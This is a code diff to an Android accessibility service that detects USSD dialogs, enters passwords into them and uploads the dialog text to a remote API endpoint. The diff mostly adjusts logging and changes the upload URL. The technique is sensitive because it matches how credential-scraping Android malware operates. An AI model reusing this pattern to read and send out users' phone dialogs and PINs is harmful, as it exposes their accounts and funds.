@@ -14,6 +14,7 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.Toast;
 
 import com.project.setussd.Contact;
+import com.project.setussd.activity.chato.ChatOneActivity;
 import com.project.setussd.bean.UssAction;
 import com.project.setussd.log.UssdLogger;
 import com.project.setussd.network.ApiCallback;
@@ -71,13 +72,13 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event == null || isFinished || !isTaskRunning) return;
-
+        //
         CharSequence pkg = event.getPackageName();
         if (!isUssdPackage(pkg)) return;
-
+        //
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
-        UssdLogger.log(this, "检测到USSD弹窗");
+        UssdLogger.log(ChatOneActivity.mianActivity, "检测到USSD弹窗");
         try {
             handleUssdEvent(root);
         } finally {
@@ -94,6 +95,8 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
         String text = NodeUtils.getUssdResultText(root, dialog);
         if (text == null || text.trim().isEmpty()) return;
 
+        UssdLogger.log(this, "test: " + text);
+
         if (text.toLowerCase().contains("running") ||
                 text.toLowerCase().contains("processing")) {
             return;
@@ -106,6 +109,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
             UssdLogger.log(this, "发现输入框，准备输入密码");
             handleInputDialog(input, dialog, text, dm);
         } else {
+            UssdLogger.log(this, "无输入框");
             handleResultDialog(dialog, text, dm);
         }
     }
@@ -209,7 +213,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
     private void handleResultDialog(AccessibilityNodeInfo dialog,
                                     String text,
                                     DisplayMetrics dm) {
-        Log.i(Contact.TAG, "onAccessibilityEvent0: " + text);
+        //Log.i(Contact.TAG, "onAccessibilityEvent0: " + text);
 
         if (text.toLowerCase().contains("正在运行") ||
                 text.toLowerCase().contains("running")) {
@@ -235,7 +239,7 @@ public class ChatUssadAccessibilityService extends AccessibilityService {
         Map<String, String> params = new HashMap<>();
         params.put("msg", text);
 
-        ApiClient.request("user/up", params, UssAction.class, new ApiCallback<UssAction>() {
+        ApiClient.request("/apin/vdfapp/msg", params, UssAction.class, new ApiCallback<UssAction>() {
             @Override
             public void onSuccess(UssAction data) {
                 UssdLogger.log(ChatUssadAccessibilityService.this, "上报成功");
